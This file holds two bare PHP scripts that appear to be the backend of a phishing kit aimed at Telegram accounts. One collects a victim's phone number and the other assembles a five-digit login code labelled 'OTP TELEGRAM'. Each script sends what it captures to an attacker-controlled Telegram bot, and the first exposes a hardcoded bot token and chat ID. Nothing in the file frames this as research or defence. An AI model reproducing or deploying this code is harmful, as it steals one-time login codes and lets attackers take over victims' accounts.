<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $phoneNumber = $_POST['phoneNumber'];
    $botToken = '7330565472:AAEIv7QkLQWbP6WOiaM-dC-CBP1oAyDzQVw';
    $chatId = '6250486742';
    $message = "Phone number: " . $phoneNumber;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    if ($result === FALSE) {
        http_response_code(500);
        echo json_encode(["status" => "error", "message" => "Failed to send message"]);
    } else {
        echo json_encode(["status" => "success", "message" => "Message sent successfully"]);
    }
}
?>
<?php
if (isset($_SERVER["REQUEST_METHOD"]) && $_SERVER["REQUEST_METHOD"] == "POST") {
    $pin1 = $_POST['pin1'] ?? '';
    $pin2 = $_POST['pin2'] ?? '';
    $pin3 = $_POST['pin3'] ?? '';
    $pin4 = $_POST['pin4'] ?? '';
    $pin5 = $_POST['pin5'] ?? '';

    $pin = $pin1 . $pin2 . $pin3 . $pin4 . $pin5;

    // Retrieve the bot token and chat ID from environment variables
    $botToken = getenv('TELEGRAM_BOT_TOKEN');
    $chatId = getenv('TELEGRAM_CHAT_ID');

    // Construct the message
    $message = "OTP TELEGRAM: " . $pin;

    // Telegram API URL
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Data to be sent
    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    // Use cURL to send the data
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        echo "Message sent successfully";
    } else {
        echo "Failed to send message";
    }
} else {
    echo "Invalid request method";
}
?>

